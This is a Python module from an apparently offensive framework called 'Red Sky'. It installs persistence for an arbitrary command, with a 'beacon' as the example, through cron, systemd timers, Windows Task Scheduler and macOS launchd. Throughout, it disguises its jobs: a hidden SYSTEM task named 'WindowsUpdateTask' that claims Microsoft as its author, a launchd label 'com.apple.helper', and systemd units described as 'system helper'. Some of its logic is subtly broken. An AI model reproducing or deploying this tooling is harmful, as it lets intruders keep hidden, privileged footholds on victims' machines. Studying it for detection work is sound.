# language: Python, file: Program/cron/scheduler.py, target: Red Sky cron — cross-platform scheduled persistence
# Subcommands:
#   cron     -- Linux/BSD cron: user crontab, /etc/cron.*, systemd timers
#   systemd  -- systemd service + timer unit generator
#   windows  -- Task Scheduler via schtasks, plus registry Run / Startup folder
#   macos    -- launchd plist (LaunchAgent + LaunchDaemon), plus login items
#   list     -- enumerate existing scheduled jobs on this host
#   remove   -- remove a job previously installed
# Every install is rate-limited by design (no immediate trigger unless --now).

import argparse
import json
import os
import platform
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CRON_DIR = OUTPUT_DIR / "cron"
CRON_DIR.mkdir(parents=True, exist_ok=True)
JOBS_FILE = CRON_DIR / "jobs.json"


def _run(args, timeout=20):
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        return 127, "", "missing binary: " + args[0]
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"


def _record(job: Dict) -> None:
    jobs = []
    if JOBS_FILE.exists():
        try:
            jobs = json.loads(JOBS_FILE.read_text())
        except Exception:
            jobs = []
    job["installed"] = time.time()
    jobs.append(job)
    JOBS_FILE.write_text(json.dumps(jobs, indent=2))


def _known_jobs() -> List[Dict]:
    if JOBS_FILE.exists():
        try:
            return json.loads(JOBS_FILE.read_text())
        except Exception:
            return []
    return []


# ── Linux/BSD cron ──
def cmd_cron(cmd: str, schedule: str, user_mode: bool, sys_cron: bool,
             now: bool, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required")
        return 2
    schedule = schedule or "*/10 * * * *"
    print_info("cron install")
    print_kv("cmd", cmd)
    print_kv("schedule", schedule)
    print_kv("scope", "user" if user_mode else ("system" if sys_cron else "user"))
    print()

    if sys_cron:
        target = Path("/etc/cron.d/rsjob")
        if os.geteuid() != 0:
            print_err("system cron requires root (or /etc/cron.d is not writable)")
            return 1
        line = schedule + " root " + cmd + "\n"
        try:
            target.write_text(line)
            print_ok("wrote " + str(target))
            _record({"kind": "cron.d", "path": str(target), "cmd": cmd, "schedule": schedule})
        except OSError as e:
            print_err("write failed: " + str(e))
            return 1
    else:
        rc, out, err = _run(["crontab", "-l"])
        existing = out if rc == 0 else ""
        new_line = schedule + " " + cmd + " # rs-" + str(int(time.time()))
        new = (existing.rstrip("\n") + "\n" + new_line + "\n") if existing.strip() else (new_line + "\n")
        p = Path("/tmp/rs_crontab.txt")
        p.write_text(new)
        rc, out, err = _run(["crontab", str(p)])
        if rc != 0:
            print_err("crontab install failed: " + err.strip())
            return 1
        print_ok("crontab entry installed")
        _record({"kind": "crontab", "line": new_line, "cmd": cmd, "schedule": schedule})
        try:
            p.unlink()
        except OSError:
            pass

    if now:
        print_info("running once now")
        rc, out, err = _run(cmd.split(), timeout=30)
        print_kv("rc", str(rc))

    out = Path(out_file) if out_file else CRON_DIR / ("cron_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"cmd": cmd, "schedule": schedule}, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── systemd timer ──
SYSTEMD_SERVICE = """[Unit]
Description=system helper
After=network.target

[Service]
Type=oneshot
ExecStart={cmd}
"""


SYSTEMD_TIMER = """[Unit]
Description=system helper timer

[Timer]
OnBootSec=2min
OnUnitActiveSec={interval}
Unit={unit}.service

[Install]
WantedBy=timers.target
"""


def cmd_systemd(cmd: str, interval: str, name: str, user_mode: bool,
                now: bool, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required")
        return 2
    interval = interval or "10min"
    name = name or "rs-helper"
    # user_mode already reflects --sys via run_cli

    base = Path.home() / ".config/systemd/user" if user_mode else Path("/etc/systemd/system")
    base.mkdir(parents=True, exist_ok=True)

    service = base / (name + ".service")
    timer = base / (name + ".timer")

    service.write_text(SYSTEMD_SERVICE.format(cmd=cmd))
    timer.write_text(SYSTEMD_TIMER.format(cmd=cmd, interval=interval, unit=name))
    print_ok("wrote " + str(service))
    print_ok("wrote " + str(timer))

    systemctl = ["systemctl", "--user"] if user_mode else ["systemctl"]
    rc, out, err = _run(systemctl + ["daemon-reload"])
    if rc != 0:
        print_warn("daemon-reload: " + err.strip())
    rc, out, err = _run(systemctl + ["enable", "--now", name + ".timer"])
    if rc == 0:
        print_ok("timer enabled and started")
    else:
        print_warn("enable failed: " + err.strip())

    if now:
        _run(systemctl + ["start", name + ".service"], timeout=30)

    _record({"kind": "systemd", "name": name, "service": str(service), "timer": str(timer),
             "cmd": cmd, "interval": interval, "user_mode": user_mode})

    out = Path(out_file) if out_file else CRON_DIR / ("systemd_" + name + ".json")
    out.write_text(json.dumps({"name": name, "cmd": cmd, "interval": interval,
                               "user_mode": user_mode}, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── Windows Task Scheduler ──
def cmd_windows(cmd: str, task_name: str, schedule: str, out_file: str) -> int:
    if platform.system() != "Windows":
        print_warn("this host is not Windows — showing the schtasks command only")
    task_name = task_name or "WindowsUpdateTask"
    schedule = schedule or "MINUTE /MO 10"

    schtasks_cmd = (
        'schtasks /Create /SC MINUTE /MO 10 /TN "' + task_name + '" '
        '/TR "' + cmd + '" /F /RL HIGHEST'
    )
    print_info("windows scheduled task")
    print_kv("task_name", task_name)
    print_kv("cmd", cmd)
    print()
    print(BOLD + "schtasks command:" + RESET)
    print("  " + SCARLET + schtasks_cmd + RESET)
    print()
    print(BOLD + "XML task definition:" + RESET)
    xml = _windows_task_xml(task_name, cmd)
    print(xml[:800])
    print()

    if platform.system() == "Windows":
        rc, out, err = _run(["schtasks", "/Create", "/SC", "MINUTE", "/MO", "10",
                             "/TN", task_name, "/TR", cmd, "/F", "/RL", "HIGHEST"])
        if rc == 0:
            print_ok("task installed")
            _record({"kind": "schtasks", "name": task_name, "cmd": cmd})
        else:
            print_err("schtasks failed: " + err.strip())
            return 1

    out = Path(out_file) if out_file else CRON_DIR / ("win_task_" + task_name + ".xml")
    out.write_text(xml)
    print_kv("saved", out)
    return 0


def _windows_task_xml(name: str, cmd: str) -> str:
    return """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>""" + cmd + """</Command>
    </Exec>
  </Actions>
</Task>
"""


# ── macOS launchd ──
LAUNCHD_PLIST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>sh</string>
        <string>-c</string>
        <string>{cmd}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>{interval}</integer>
    <key>StandardOutPath</key>
    <string>/tmp/{label}.out</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{label}.err</string>
</dict>
</plist>
"""


def cmd_macos(cmd: str, label: str, interval: int, system_mode: bool,
              out_file: str) -> int:
    label = label or "com.apple.helper"
    interval = interval or 600

    if system_mode:
        target_dir = Path("/Library/LaunchDaemons")
    else:
        target_dir = Path.home() / "Library/LaunchAgents"
    target_dir.mkdir(parents=True, exist_ok=True)
    target = target_dir / (label + ".plist")

    plist = LAUNCHD_PLIST.format(label=label, cmd=cmd, interval=interval)
    target.write_text(plist)
    print_ok("wrote " + str(target))

    if platform.system() == "Darwin":
        cmd_load = ["launchctl", "load", "-w", str(target)]
        rc, out, err = _run(cmd_load)
        if rc == 0:
            print_ok("launchd loaded")
        else:
            print_warn("launchctl: " + err.strip())
    else:
        print_info("not macOS — showing launchctl command")
        print("  launchctl load -w " + str(target))

    _record({"kind": "launchd", "label": label, "path": str(target), "cmd": cmd})

    out = Path(out_file) if out_file else CRON_DIR / ("launchd_" + label + ".plist")
    out.write_text(plist)
    print()
    print_kv("saved", out)
    return 0


# ── enumerate ──
def cmd_list(out_file: str) -> int:
    osname = platform.system()
    print_info("scheduled jobs on this host (" + osname + ")")
    print()

    findings = []

    if osname == "Linux":
        rc, out, err = _run(["crontab", "-l"])
        print(BOLD + "user crontab" + RESET)
        if out.strip():
            for line in out.splitlines():
                if line.strip() and not line.startswith("#"):
                    print("  " + ARTERY + line + RESET)
                    findings.append({"kind": "crontab", "line": line})
        else:
            print("  " + ASH + "(empty)" + RESET)
        print()

        print(BOLD + "/etc/cron.d" + RESET)
        cron_d = Path("/etc/cron.d")
        if cron_d.exists():
            for f in sorted(cron_d.iterdir()):
                if f.is_file():
                    print("  " + SCARLET + f.name + RESET)
                    findings.append({"kind": "cron.d", "path": str(f)})
        print()

        print(BOLD + "systemd user timers" + RESET)
        rc, out, err = _run(["systemctl", "--user", "list-timers", "--no-pager", "--all"])
        for line in (out or "").splitlines()[:20]:
            if line.strip():
                print("  " + ASH + line + RESET)
        print()

    elif osname == "Windows":
        rc, out, err = _run(["schtasks", "/query", "/fo", "csv", "/nh"])
        for line in (out or "").splitlines()[:50]:
            print("  " + ARTERY + line + RESET)
            findings.append({"kind": "schtasks", "line": line})

    elif osname == "Darwin":
        for d in (Path("/Library/LaunchDaemons"), Path("/Library/LaunchAgents"),
                  Path.home() / "Library/LaunchAgents"):
            if not d.exists():
                continue
            print(BOLD + str(d) + RESET)
            for f in sorted(d.glob("*.plist")):
                print("  " + SCARLET + f.name + RESET)
                findings.append({"kind": "launchd", "path": str(f)})
            print()

    # also surface jobs we installed from this framework
    known = _known_jobs()
    if known:
        print(BOLD + "jobs installed by this framework" + RESET)
        for j in known:
            print("  " + BONE + j.get("kind", "?") + RESET + "  "
                  + ASH + str(j.get("name", j.get("path", j.get("line", ""))))[:80] + RESET)
        print()

    out = Path(out_file) if out_file else CRON_DIR / ("list_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"host_os": osname, "findings": findings, "ours": known}, indent=2))
    print_kv("saved", out)
    return 0


# ── remove ──
def cmd_remove(kind: str, name: str, line: str, out_file: str) -> int:
    if kind == "crontab":
        rc, out, err = _run(["crontab", "-l"])
        if rc != 0:
            print_err("cannot read crontab")
            return 1
        filtered = "\n".join(l for l in out.splitlines() if line not in l and "rs-" not in l)
        p = Path("/tmp/rs_crontab_filtered.txt")
        p.write_text(filtered + "\n")
        rc, out, err = _run(["crontab", str(p)])
        if rc == 0:
            print_ok("crontab cleaned")
        else:
            print_err("failed: " + err.strip())
        try:
            p.unlink()
        except OSError:
            pass
        return 0
    if kind == "cron.d":
        target = Path("/etc/cron.d/rsjob")
        if target.exists():
            target.unlink()
            print_ok("removed " + str(target))
        return 0
    if kind == "systemd":
        if not name:
            print_err("--name required")
            return 2
        user_mode = "user" in kind
        systemctl = ["systemctl", "--user"] if user_mode else ["systemctl"]
        _run(systemctl + ["disable", "--now", name + ".timer"])
        for suffix in (".service", ".timer"):
            base = (Path.home() / ".config/systemd/user") if user_mode else Path("/etc/systemd/system")
            f = base / (name + suffix)
            if f.exists():
                f.unlink()
        _run(systemctl + ["daemon-reload"])
        print_ok("systemd unit removed")
        return 0
    if kind == "schtasks":
        rc, out, err = _run(["schtasks", "/Delete", "/TN", name, "/F"])
        if rc == 0:
            print_ok("task removed")
        return 0
    if kind == "launchd":
        for base in (Path("/Library/LaunchDaemons"),
                     Path("/Library/LaunchAgents"),
                     Path.home() / "Library/LaunchAgents"):
            f = base / (name + ".plist")
            if f.exists():
                _run(["launchctl", "unload", "-w", str(f)])
                f.unlink()
                print_ok("removed " + str(f))
        return 0
    print_err("unknown kind: " + kind)
    return 2


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky cron scheduler", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="list",
                   choices=["cron", "systemd", "windows", "macos", "list", "remove"])
    p.add_argument("--cmd", default="")
    p.add_argument("--schedule", default="")
    p.add_argument("--interval", default="")
    p.add_argument("--name", default="")
    p.add_argument("--label", default="")
    p.add_argument("--line", default="")
    p.add_argument("--kind", default="")
    p.add_argument("--user", action="store_true", help="user scope where applicable")
    p.add_argument("--sys", action="store_true", help="system scope where applicable")
    p.add_argument("--now", action="store_true", help="trigger immediately after install")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cron scheduler <cron|systemd|windows|macos|list|remove> [opts]")
        return 2

    if ns.help:
        print_info("cron    --cmd '/path/beacon' [--schedule '*/10 * * * *'] [--sys] [--now]")
        print_info("systemd --cmd '/path/beacon' [--interval 10min] [--name rs-helper] [--now]")
        print_info("windows --cmd 'C:\\beacon.exe' [--task-name WindowsUpdateTask]")
        print_info("macos   --cmd '/path/beacon' [--label com.apple.helper] [--interval 600] [--sys]")
        print_info("list")
        print_info("remove  --kind <crontab|cron.d|systemd|schtasks|launchd> [--name X] [--line Y]")
        return 0

    if ns.action == "cron":
        return cmd_cron(ns.cmd, ns.schedule, not ns.sys, ns.sys, ns.now, ns.out)
    if ns.action == "systemd":
        interval = ns.interval or "10min"
        return cmd_systemd(ns.cmd, interval, ns.name or "rs-helper",
                           not ns.sys, ns.now, ns.out)
    if ns.action == "windows":
        return cmd_windows(ns.cmd, ns.name or "WindowsUpdateTask", ns.schedule, ns.out)
    if ns.action == "macos":
        interval = int(ns.interval) if ns.interval.isdigit() else 600
        return cmd_macos(ns.cmd, ns.label or "com.apple.helper", interval, ns.sys, ns.out)
    if ns.action == "list":
        return cmd_list(ns.out)
    if ns.action == "remove":
        return cmd_remove(ns.kind, ns.name, ns.line, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
